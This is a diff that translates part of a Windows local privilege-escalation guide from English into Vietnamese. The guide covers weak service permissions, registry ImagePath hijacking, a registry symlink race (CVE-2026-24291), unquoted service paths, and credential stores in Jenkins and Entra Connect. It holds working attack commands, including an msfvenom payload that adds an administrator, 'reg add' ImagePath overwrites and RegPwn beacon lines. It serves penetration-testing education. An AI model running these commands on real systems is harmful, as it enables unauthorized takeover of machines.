+- **GENERIC_WRITE**: Kế thừa khả năng thay đổi cấu hình dịch vụ.
+- **GENERIC_ALL**: Cũng kế thừa khả năng thay đổi cấu hình dịch vụ.
 
-For the detection and exploitation of this vulnerability, the _exploit/windows/local/service_permissions_ can be utilized.
+Có thể sử dụng _exploit/windows/local/service_permissions_ để phát hiện và khai thác lỗ hổng này.
 
-### Services binaries weak permissions
+### Quyền yếu trên binary dịch vụ
 
-If a service runs as **`LocalSystem`**, **`LocalService`**, **`NetworkService`**, or a privileged domain account, but **low-privileged users can modify the service EXE or its parent folder**, the service can often be hijacked by **replacing the binary and restarting the service**.
+Nếu một dịch vụ chạy với quyền **`LocalSystem`**, **`LocalService`**, **`NetworkService`** hoặc một tài khoản domain có đặc quyền, nhưng **người dùng có đặc quyền thấp có thể sửa đổi EXE của dịch vụ hoặc thư mục cha của nó**, thì dịch vụ thường có thể bị chiếm quyền bằng cách **thay thế binary và khởi động lại dịch vụ**.
 
-**Check if you can modify the binary that is executed by a service** or if you have **write permissions on the folder** where the binary is located ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
-You can get every binary that is executed by a service using **wmic** (not in system32) and check your permissions using **icacls**:
+**Kiểm tra xem bạn có thể sửa đổi binary mà dịch vụ thực thi hay không**, hoặc bạn có **quyền ghi vào thư mục** chứa binary đó hay không ([**DLL Hijacking**](dll-hijacking/index.html)**.**\
+Bạn có thể lấy danh sách mọi binary được dịch vụ thực thi bằng **wmic** (không nằm trong system32), rồi kiểm tra quyền của mình bằng **icacls**:
 
 ```bash
 for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt
@@ -820,7 +820,7 @@ for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^
 for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
 ```
 
-You can also use **sc** and **icacls**:
+Bạn cũng có thể sử dụng **sc** và **icacls**:
 
 ```bash
 sc qc <service_name>
@@ -831,14 +831,14 @@ FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Te
 FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
 ```
 
-Look for dangerous ACLs granted to **`Everyone`**, **`BUILTIN\Users`**, or **`Authenticated Users`**, especially **`(F)`**, **`(M)`**, or **`(W)`** on the service executable or on the directory containing it. A practical abuse flow is:<sup>[[27]](#references)</sup>
+Tìm các ACL nguy hiểm được cấp cho **`Everyone`**, **`BUILTIN\Users`** hoặc **`Authenticated Users`**, đặc biệt là **`(F)`**, **`(M)`** hoặc **`(W)`** trên tệp thực thi dịch vụ hoặc thư mục chứa tệp đó. Quy trình khai thác thực tế như sau:<sup>[[27]](#references)</sup>
 
-1. Confirm the service account and executable path with `sc qc <service_name>`.
-2. Confirm that the binary is writable with `icacls <path>`.
-3. Replace the service binary with a payload or a valid malicious service binary.
-4. Restart the service with `sc stop <service_name> && sc start <service_name>` (or wait for a reboot / service trigger).
+1. Xác nhận tài khoản dịch vụ và đường dẫn tệp thực thi bằng `sc qc <service_name>`.
+2. Xác nhận tệp binary có thể ghi được bằng `icacls <path>`.
+3. Thay thế tệp binary của dịch vụ bằng payload hoặc một tệp binary dịch vụ độc hại hợp lệ.
+4. Khởi động lại dịch vụ bằng `sc stop <service_name> && sc start <service_name>` (hoặc chờ khởi động lại / kích hoạt dịch vụ).
 
-Useful automated checks:<sup>[[28]](#references)</sup>
+Các bước kiểm tra tự động hữu ích:<sup>[[28]](#references)</sup>
 
 ```powershell
 . .\PowerUp.ps1
@@ -849,12 +849,12 @@ SharpUp.exe audit ModifiableServiceBinaries
 Invoke-PrivescCheck -Extended -Audit
 ```
 
-> If the service does not allow a normal user to restart it, check whether it starts automatically on boot, has a failure action that relaunches it, or can be triggered indirectly by the application using it.
+> Nếu dịch vụ không cho phép người dùng thông thường khởi động lại, hãy kiểm tra xem dịch vụ có tự khởi động khi boot, có failure action để khởi chạy lại hay có thể được ứng dụng đang sử dụng dịch vụ kích hoạt gián tiếp hay không.
 
-### Services registry modify permissions
+### Quyền sửa đổi registry của dịch vụ
 
-You should check if you can modify any service registry.\
-You can **check** your **permissions** over a service **registry** doing:
+Bạn nên kiểm tra xem mình có thể sửa đổi registry của dịch vụ nào không.\
+Bạn có thể **kiểm tra** **quyền** của mình đối với **registry** dịch vụ bằng cách:
 
 ```bash
 reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services
@@ -865,43 +865,43 @@ for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\
 get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
 ```
 
-The original permission test was stated as:
+Bài kiểm tra quyền ban đầu được nêu như sau:
 
-It should be checked whether **Authenticated Users** or **NT AUTHORITY\INTERACTIVE** possess `FullControl` permissions. If so, the binary executed by the service can be altered.
+Cần kiểm tra xem **Authenticated Users** hoặc **NT AUTHORITY\INTERACTIVE** có quyền `FullControl` hay không. Nếu có, có thể sửa đổi binary được dịch vụ thực thi.
 
-Review whether **Authenticated Users** or **NT AUTHORITY\INTERACTIVE** have write-capable registry permissions on a particular service key. An ACL entry alone does not prove effective access: deny entries, the current token, and inherited permissions matter. Registry-key rights are separate from the service object's `SERVICE_CHANGE_CONFIG` and `SERVICE_START` rights. Escalation also requires a usable service configuration field, a way to trigger the service, and a more privileged service identity. See Microsoft's [registry-key rights](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) and [service access-rights reference](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).
+Kiểm tra xem **Authenticated Users** hoặc **NT AUTHORITY\INTERACTIVE** có quyền trên registry key của một dịch vụ cụ thể cho phép ghi hay không. Chỉ có một mục ACL thôi chưa chứng minh được quyền truy cập thực tế: các mục từ chối, token hiện tại và quyền kế thừa đều có ảnh hưởng. Quyền trên registry key khác với quyền `SERVICE_CHANGE_CONFIG` và `SERVICE_START` trên đối tượng dịch vụ. Để leo thang đặc quyền, còn cần một trường cấu hình dịch vụ có thể sử dụng, cách kích hoạt dịch vụ và một danh tính dịch vụ có đặc quyền cao hơn. Xem tài liệu của Microsoft về [quyền trên registry key](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) và [tham chiếu về quyền truy cập dịch vụ](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).
 
-To change the Path of the binary executed:
+Để thay đổi Path của binary được thực thi:
 
 ```bash
 reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
 ```
 
-### Registry symlink race to arbitrary HKLM value write (ATConfig)
+### Race symlink Registry để ghi giá trị HKLM bất kỳ (ATConfig)
 
-Some Windows Accessibility features create per-user **ATConfig** keys that are later copied by a **SYSTEM** process into an HKLM session key. A registry **symbolic link race** can redirect that privileged write into **any HKLM path**, giving an arbitrary HKLM **value write** primitive.<sup>[[18]](#references)</sup>
+Một số tính năng Trợ năng của Windows tạo các khóa **ATConfig** theo từng người dùng, sau đó một tiến trình **SYSTEM** sao chép chúng vào khóa phiên HKLM. Một **race symbolic link** trong Registry có thể chuyển hướng thao tác ghi đặc quyền này đến **bất kỳ đường dẫn HKLM nào**, tạo primitive **ghi giá trị HKLM** tùy ý.<sup>[[18]](#references)</sup>
 
-Key locations (example: On-Screen Keyboard `osk`):
+Các vị trí khóa (ví dụ: On-Screen Keyboard `osk`):
 
-- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` lists installed accessibility features.
-- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` stores user-controlled configuration.
-- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` is created during logon/secure-desktop transitions and is writable by the user.
+- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` liệt kê các tính năng trợ năng đã cài đặt.
+- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` lưu cấu hình do người dùng kiểm soát.
+- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` được tạo khi đăng nhập/chuyển sang secure desktop và người dùng có thể ghi vào.
 
-Abuse flow (CVE-2026-24291 / ATConfig):
+Quy trình khai thác (CVE-2026-24291 / ATConfig):
 
-1. Populate the **HKCU ATConfig** value you want to be written by SYSTEM.
-2. Trigger the secure-desktop copy (e.g., **LockWorkstation**), which starts the AT broker flow.
-3. **Win the race** by placing an **oplock** on `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; when the oplock fires, replace the **HKLM Session ATConfig** key with a **registry link** to a protected HKLM target.
-4. SYSTEM writes the attacker-chosen value to the redirected HKLM path.
+1. Điền giá trị **HKCU ATConfig** mà bạn muốn SYSTEM ghi.
+2. Kích hoạt thao tác sao chép secure desktop (ví dụ: **LockWorkstation**), thao tác này khởi chạy luồng AT broker.
+3. **Thắng race** bằng cách đặt một **oplock** trên `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; khi oplock kích hoạt, thay khóa **HKLM Session ATConfig** bằng một **registry link** trỏ đến mục tiêu HKLM được bảo vệ.
+4. SYSTEM ghi giá trị do kẻ tấn công chọn vào đường dẫn HKLM đã được chuyển hướng.
 
-Once you have arbitrary HKLM value write, pivot to LPE by overwriting service configuration values:
+Khi đã có khả năng ghi giá trị HKLM tùy ý, hãy pivot sang LPE bằng cách ghi đè các giá trị cấu hình dịch vụ:
 
-- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
+- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/dòng lệnh)
 - `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)
 
-Pick a service that a normal user can start (e.g., **`msiserver`**) and trigger it after the write. **Note:** the public exploit implementation **locks the workstation** as part of the race.
+Chọn một dịch vụ mà người dùng bình thường có thể khởi động (ví dụ: **`msiserver`**) rồi kích hoạt dịch vụ đó sau khi ghi giá trị. **Lưu ý:** cách triển khai exploit công khai **khóa workstation** trong quá trình race.
 
-Example tooling (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>
+Công cụ ví dụ (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>
 
 ```bash
 beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
@@ -909,10 +909,9 @@ beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Paramet
 net start msiserver
 ```
 
-### Services registry AppendData/AddSubdirectory permissions
+### Quyền AppendData/AddSubdirectory trên Registry của Services
 
-If you have this permission over a registry this means to **you can create sub registries from this one**. In case of Windows services this is **enough to execute arbitrary code:**
-
+Nếu bạn có quyền này trên một registry, điều đó có nghĩa là **bạn có thể tạo registry con từ registry này**. Với Windows services, quyền này **đủ để thực thi mã tùy ý:**
 
 {{#ref}}
 appenddata-addsubdirectory-permission-over-service-registry.md
@@ -920,9 +919,9 @@ appenddata-addsubdirectory-permission-over-service-registry.md
 
 ### Unquoted Service Paths
 
-If the path to an executable is not inside quotes, Windows will try to execute every ending before a space.
+Nếu đường dẫn đến tệp thực thi không được đặt trong dấu ngoặc kép, Windows sẽ thử thực thi mọi phần kết thúc trước một dấu cách.
 
-For example, for the path _C:\Program Files\Some Folder\Service.exe_ Windows will try to execute:
+Ví dụ, với đường dẫn _C:\Program Files\Some Folder\Service.exe_, Windows sẽ thử thực thi:
 
 ```bash
 C:\Program.exe
@@ -930,7 +929,7 @@ C:\Program Files\Some.exe
 C:\Program Files\Some Folder\Service.exe
 ```
 
-List all unquoted service paths, excluding those belonging to built-in Windows services:
+Liệt kê tất cả các đường dẫn dịch vụ không được đặt trong dấu ngoặc kép, ngoại trừ những đường dẫn thuộc các dịch vụ Windows tích hợp sẵn:
 
 ```bash
 wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
@@ -952,35 +951,35 @@ for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
 gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
 ```
 
-**You can detect and exploit** this vulnerability with metasploit: `exploit/windows/local/trusted\_service\_path` You can manually create a service binary with metasploit:
+**Bạn có thể phát hiện và khai thác** lỗ hổng này bằng metasploit: `exploit/windows/local/trusted\_service\_path` Bạn có thể tạo thủ công một service binary bằng metasploit:
 
 ```bash
 msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
 ```
 
-### Recovery Actions
+### Hành động khôi phục
 
-Windows allows users to specify actions to be taken if a service fails. This feature can be configured to point to a binary. If this binary is replaceable, privilege escalation might be possible. More details can be found in the [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).
+Windows cho phép người dùng chỉ định các hành động sẽ được thực hiện nếu một dịch vụ gặp lỗi. Có thể cấu hình tính năng này để trỏ đến một binary. Nếu có thể thay thế binary này, thì có thể leo thang đặc quyền. Xem thêm chi tiết trong [tài liệu chính thức](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).
 
-## Scheduled task script targets
+## Đích đến của script trong tác vụ đã lên lịch
 
-For an enabled task that runs `cmd.exe /c` with a `.bat` or `.cmd` file, check the script named in the **action arguments** as well as `cmd.exe`. The same applies to an interpreter's explicit file argument, such as PowerShell `-File`. If a scheduled batch file contains a literal PowerShell `-File` call, inspect that referenced script's ACL too; variables, conditionals, and shell chaining require manual tracing. A caller-writable script or parent directory is a cross-account execution lead only when the configured task principal differs from the caller and the task actually reaches that action. An append-only ACL can matter for scripts, but an earlier `exit` or other control flow may make appended lines unreachable. Confirm effective ACLs, [task execution context](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), working directory, trigger, and application-control policy before claiming escalation. Inventory should not modify the script or start the task.
+Với một tác vụ được bật chạy `cmd.exe /c` cùng tệp `.bat` hoặc `.cmd`, hãy kiểm tra script được nêu trong **đối số hành động** cũng như `cmd.exe`. Điều tương tự áp dụng cho đối số tệp được chỉ định rõ ràng cho trình thông dịch, chẳng hạn như `-File` của PowerShell. Nếu một tệp batch đã lên lịch chứa lệnh gọi PowerShell `-File` trực tiếp, hãy kiểm tra cả ACL của script được tham chiếu; cần lần theo thủ công các biến, điều kiện và chuỗi lệnh trong shell. Một script hoặc thư mục cha mà người gọi có quyền ghi chỉ là đầu mối để thực thi chéo tài khoản khi principal của tác vụ được cấu hình khác với người gọi và tác vụ thực sự chạy đến hành động đó. ACL chỉ cho phép ghi nối thêm có thể ảnh hưởng đến script, nhưng lệnh `exit` trước đó hoặc luồng điều khiển khác có thể khiến các dòng được nối thêm không thể chạy tới. Hãy xác nhận ACL hiệu lực, [ngữ cảnh thực thi tác vụ](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), thư mục làm việc, trigger và chính sách kiểm soát ứng dụng trước khi kết luận có thể leo thang đặc quyền. Quá trình kiểm kê không được sửa đổi script hoặc khởi chạy tác vụ.
 
-## Named streams on accessible files
+## Named stream trên các tệp có thể truy cập
 
-On NTFS, a readable file can have a named `:$DATA` stream whose contents are not shown by an ordinary directory listing. For a small, relevant set of accessible backups or configuration files, review stream **names and sizes** before opening any content; Windows exposes them through [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams), and PowerShell's [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). A stream name suggesting a secret is only a lead. Check the file's effective read access, the filesystem's stream support, whether the stream contains usable credentials, and the account they actually authenticate as. Avoid recursive stream scans and printing stream contents during routine enumeration.
+Trên NTFS, một tệp có thể đọc được có thể chứa named `:$DATA` stream mà danh sách thư mục thông thường không hiển thị. Với một tập hợp nhỏ, phù hợp gồm các tệp sao lưu hoặc tệp cấu hình có thể truy cập, hãy xem lại **tên và kích thước** của stream trước khi mở nội dung; Windows cung cấp khả năng này qua [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) và PowerShell [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Tên stream gợi ý có chứa secret chỉ là một đầu mối. Hãy kiểm tra quyền đọc hiệu lực của tệp, khả năng hỗ trợ stream của filesystem, liệu stream có chứa thông tin xác thực hữu dụng hay không và tài khoản mà thông tin đó thực sự xác thực. Tránh quét stream đệ quy và in nội dung stream trong quá trình kiểm kê thông thường.
 
-## Scheduled Windows Driver Kit helper inputs
+## Tệp đầu vào cho helper của Windows Driver Kit được lên lịch
 
-The optional Windows Driver Kit includes `StandaloneRunner.exe`, which can consume `command.txt`, `reboot.rsf`, and a project `working\rsf.rsf` file from its run directory. A scheduled task or service that starts this helper with a privileged account can turn low-privilege write access to those inputs into command execution in that account's context, even when the helper executable itself is protected. Confirm the privileged consumer and that **both** sidecar files can be created or modified; finding the helper alone is insufficient.
+Windows Driver Kit tùy chọn bao gồm `StandaloneRunner.exe`, có thể sử dụng các tệp `command.txt`, `reboot.rsf` và tệp `working\rsf.rsf` của project từ thư mục chạy. Một tác vụ đã lên lịch hoặc dịch vụ khởi chạy helper này bằng tài khoản có đặc quyền có thể biến quyền ghi ở mức đặc quyền thấp vào các tệp đầu vào đó thành việc thực thi lệnh trong ngữ cảnh của tài khoản ấy, ngay cả khi bản thân tệp thực thi của helper được bảo vệ. Hãy xác nhận có tiến trình đặc quyền sử dụng các tệp này và **cả hai** tệp sidecar đều có thể được tạo hoặc sửa đổi; chỉ tìm thấy helper là chưa đủ.
 
-For a scheduled task, inspect its action's [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) and the ACLs of the two sidecar paths. If the task does not specify a working directory, the executable's directory is only a lead to verify, not proof of where the task reads its inputs. The project working-file prerequisite must also be satisfied. Check the actual task principal rather than assuming it runs as SYSTEM.
+Với tác vụ đã lên lịch, hãy kiểm tra [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) trong action của tác vụ và ACL của hai đường dẫn sidecar. Nếu tác vụ không chỉ định thư mục làm việc, thư mục của tệp thực thi chỉ là một đầu mối cần xác minh, không phải bằng chứng về nơi tác vụ đọc các tệp đầu vào. Điều kiện tiên quyết về tệp làm việc của project cũng phải được đáp ứng. Hãy kiểm tra principal thực tế của tác vụ thay vì giả định tác vụ chạy dưới quyền SYSTEM.
 
-## Applications
+## Ứng dụng
 
-### Installed Applications
+### Ứng dụng đã cài đặt
 
-Check **permissions of the binaries** (maybe you can overwrite one and escalate privileges) and of the **folders** ([DLL Hijacking](dll-hijacking/index.html)).
+Kiểm tra **quyền của các binary** (có thể bạn ghi đè được một binary để leo thang đặc quyền) và **các thư mục** ([DLL Hijacking](dll-hijacking/index.html)).
 
 ```bash
 dir /a "C:\Program Files"
@@ -991,35 +990,35 @@ Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,Last
 Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
 ```
 
-#### Checkmk Windows agent repair path
+#### Đường dẫn sửa chữa Windows agent của Checkmk
 
-[CVE-2024-0670](https://checkmk.com/werk/16361) affects older Checkmk Windows agents that wrote command files in `C:\Windows\Temp` and then executed a pre-existing write-protected file when replacement failed. The vendor fixed the issue in 2.1.0p40, 2.2.0p23, 2.3.0b1, and 2.4.0b1. Check the full installed patch level and whether the affected agent operation can run; a branch-only label such as `2.1` cannot establish exposure. Enumeration can inspect version, service state, and Temp permissions without creating files or triggering agent commands.
+[CVE-2024-0670](https://checkmk.com/werk/16361) ảnh hưởng đến các Windows agent Checkmk đời cũ, vốn ghi file lệnh vào `C:\Windows\Temp` rồi thực thi một file đã tồn tại và được bảo vệ chống ghi khi thao tác thay thế thất bại. Nhà cung cấp đã khắc phục vấn đề này trong các phiên bản 2.1.0p40, 2.2.0p23, 2.3.0b1 và 2.4.0b1. Hãy kiểm tra đầy đủ cấp bản vá đã cài đặt và xem thao tác agent bị ảnh hưởng có thể chạy hay không; nhãn chỉ thể hiện nhánh như `2.1` không đủ để xác định có bị ảnh hưởng hay không. Việc enumeration có thể kiểm tra phiên bản, trạng thái service và quyền trên Temp mà không tạo file hoặc kích hoạt lệnh agent.
 
-#### ADSelfService Plus SAML service review
+#### Rà soát service SAML của ADSelfService Plus
 
-[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) affected ADSelfService Plus build 6210 and earlier; the vendor fixed it in build 6211. It is relevant only if SAML SSO **is or was** enabled. An installed-product entry or service path is therefore a lead, not a vulnerability verdict: confirm the exact build, the SAML configuration history, network reachability of the service, and the account it runs under. Code execution through the service inherits that account's privileges; SYSTEM execution requires a SYSTEM-run instance. A readable `OfflineBackup_*.ezip` in the product's Backup directory is a separate encrypted backup lead, not evidence of a usable credential or this SAML flaw. Record its path and access rights without unpacking it during routine enumeration.
+[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) ảnh hưởng đến ADSelfService Plus bản dựng 6210 trở xuống; nhà cung cấp đã khắc phục trong bản dựng 6211. Lỗ hổng chỉ liên quan nếu SAML SSO **đang hoặc từng được** bật. Do đó, mục sản phẩm đã cài đặt hoặc đường dẫn service chỉ là manh mối, không phải kết luận về lỗ hổng: hãy xác nhận chính xác bản dựng, lịch sử cấu hình SAML, khả năng truy cập mạng của service và tài khoản mà service chạy dưới quyền. Việc thực thi code thông qua service sẽ kế thừa quyền của tài khoản đó; để chạy dưới quyền SYSTEM, instance phải chạy với tài khoản SYSTEM. Một file `OfflineBackup_*.ezip` có thể đọc được trong thư mục Backup của sản phẩm là một manh mối riêng về bản sao lưu được mã hóa, không phải bằng chứng về thông tin xác thực có thể sử dụng hoặc lỗ hổng SAML này. Trong quá trình enumeration thông thường, hãy ghi lại đường dẫn và quyền truy cập của file mà không giải nén.
 
-#### Jenkins controller and domain-account boundaries
+#### Ranh giới quyền của Jenkins controller và tài khoản domain
 
-On a Windows Jenkins controller, distinguish permission to create or configure a job from permission to start it: [Jenkins documents these as separate `Job/Create`, `Job/Configure`, and `Job/Build` rights](https://www.jenkins.io/doc/book/security/access-control/permissions/). A configured schedule or remote trigger may provide another build route, but confirm that it is enabled and the build actually runs. Execution has the identity of the controller or selected agent, and a stored credential is usable only if the job can access its scope. Separately, inspect access to `JENKINS_HOME` metadata: Jenkins keeps credential material and encryption keys in `credentials.xml`, `secrets/hudson.util.Secret`, and `secrets/master.key` ([Jenkins secret storage](https://www.jenkins.io/doc/developer/security/secrets/)). Their presence alone does not reveal a password; verify **read access to the required files** and a distinct account-reuse path without printing secrets in shared output. If that account has an AD user-object `scriptPath` write right, confirm a writable script path and a real logon or scheduled consumer running as the target user before treating it as cross-user execution. Further group control requires separately verified effective AD rights.
+Trên Windows Jenkins controller, hãy phân biệt quyền tạo hoặc cấu hình job với quyền khởi chạy job: [Jenkins mô tả đây là các quyền `Job/Create`, `Job/Configure` và `Job/Build` riêng biệt](https://www.jenkins.io/doc/book/security/access-control/permissions/). Lịch chạy đã cấu hình hoặc remote trigger có thể tạo thêm một cách chạy build, nhưng cần xác nhận tính năng đó được bật và build thực sự chạy. Quá trình thực thi sử dụng danh tính của controller hoặc agent được chọn; credential đã lưu chỉ có thể dùng được nếu job truy cập được phạm vi của credential đó. Riêng biệt, hãy kiểm tra quyền truy cập metadata trong `JENKINS_HOME`: Jenkins lưu credential và khóa mã hóa trong `credentials.xml`, `secrets/hudson.util.Secret` và `secrets/master.key` ([lưu trữ secret của Jenkins](https://www.jenkins.io/doc/developer/security/secrets/)). Chỉ sự hiện diện của các file này không tiết lộ mật khẩu; hãy xác minh **quyền đọc các file cần thiết** và một đường dẫn sử dụng lại tài khoản riêng biệt, đồng thời không in secret ra đầu ra dùng chung. Nếu tài khoản đó có quyền ghi `scriptPath` trên đối tượng người dùng AD, hãy xác nhận đường dẫn script có thể ghi được và có một lần đăng nhập thực tế hoặc tiến trình tiêu thụ theo lịch chạy dưới quyền người dùng mục tiêu trước khi xem đây là khả năng thực thi xuyên người dùng. Muốn kiểm soát thêm các group thì cần xác minh riêng các quyền AD hiệu lực.
 
-#### Azure Pipelines self-hosted agent identity
+#### Danh tính của Azure Pipelines self-hosted agent
 
-For an Azure DevOps Server or Azure Pipelines project, separate permission to **create or edit** a pipeline from permission to **queue** it and use the selected agent pool; [Microsoft documents pipeline permissions](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) and [pool authorization](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops) independently. If a lower-privileged account can submit a script step and run that pipeline on a self-hosted Windows agent, the step executes as the [agent's configured operating-system account](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Verify the exact pipeline, branch/resource restrictions, authorized pool, runnable job, and agent service identity before claiming a cross-user or SYSTEM transition. An installed agent, project role, or repository write alone is only a lead; review permissions and local service metadata without starting a build during passive enumeration.
+Với dự án Azure DevOps Server hoặc Azure Pipelines, hãy phân biệt quyền **tạo hoặc chỉnh sửa** pipeline với quyền **xếp hàng chạy** pipeline và sử dụng agent pool đã chọn; [Microsoft mô tả riêng quyền pipeline](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) và [quyền cấp phép pool](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops). Nếu tài khoản có quyền thấp hơn có thể gửi một bước script và chạy pipeline đó trên self-hosted Windows agent, bước này sẽ chạy dưới quyền [tài khoản hệ điều hành đã cấu hình cho agent](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Trước khi kết luận có chuyển quyền xuyên người dùng hoặc lên SYSTEM, hãy xác minh chính xác pipeline, các giới hạn về branch/resource, pool được cấp quyền, job có thể chạy và danh tính service của agent. Agent đã cài đặt, vai trò dự án hoặc quyền ghi repository chỉ là manh mối; hãy rà soát quyền và metadata service cục bộ mà không khởi chạy build trong quá trình enumeration thụ động.
 
-#### Microsoft Entra Connect Sync credentials
+#### Credential của Microsoft Entra Connect Sync
 
-[Microsoft distinguishes](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) the **ADSync service account**, which runs the synchronization service and accesses its SQL database, from the **AD DS connector account**, whose directory permissions depend on the configured sync features. Connector credentials are stored encrypted in that database, with key material [protected by DPAPI under the ADSync service account](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). An installed sync service, a local administrator-sounding group, or database visibility alone does not establish a decryptable credential or domain escalation. Review the actual database read rights, service-account/key access, installation and SQL layout, configured connector identity, and that identity's effective AD privileges separately. Routine enumeration should show only service and access metadata, not query or print the stored secrets.
+[Microsoft phân biệt](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) **tài khoản service ADSync**, dùng để chạy dịch vụ đồng bộ và truy cập SQL database, với **tài khoản connector AD DS**, có quyền thư mục tùy thuộc vào các tính năng đồng bộ đã cấu hình. Credential của connector được lưu mã hóa trong database đó, với key material được [DPAPI bảo vệ dưới tài khoản service ADSync](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Chỉ riêng việc có service đồng bộ đã cài đặt, một group có tên giống như quản trị viên cục bộ hoặc khả năng xem database không đủ để chứng minh credential có thể giải mã hoặc có thể leo thang lên domain. Hãy rà soát riêng quyền đọc database thực tế, quyền truy cập service account/key, bố cục cài đặt và SQL, danh tính connector đã cấu hình, cùng các quyền AD hiệu lực của danh tính đó. Enumeration thông thường chỉ nên hiển thị metadata về service và quyền truy cập, không truy vấn hoặc in ra secret đã lưu.
 
-#### Printer driver support DLL permissions
+#### Quyền trên support DLL của printer driver
 
-An installed printer driver may keep support DLLs under `C:\ProgramData` and load them in a more privileged print process. Review the exact driver directory and DLL ACLs, including parent directories and reparse points, even if printer WMI enumeration is denied. For the [Ricoh printer-driver issue CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1), the reported path was `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [the original disclosure](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) describes DLL loading by `PrintIsolationHost.exe`. A writable ACL is only a lead: verify effective write access after deny entries, that the relevant driver is installed and loads the file under a privileged identity, and whether the vendor's updated driver or security program has fixed the installation. Do not infer vulnerability from the directory name or driver version alone.
